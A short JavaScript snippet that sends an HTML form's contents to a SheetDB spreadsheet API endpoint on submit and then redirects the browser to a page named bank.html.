let formbage2 = document.getElementById("sheetdb-form-data");
formbage2.action = "https://sheetdb.io/api/v1/e2dtwpi9kmzjf";
formbage2.addEventListener("submit", (e) => {
  e.preventDefault();
  fetch(formbage2.action, {
    method: "POST",
    body: new FormData(document.getElementById("sheetdb-form-data")),
  })
    .then((response) => response.json())
    .then((html) => {
      // you can put any JS code here
      window.location.href = "bank.html";
    });
});
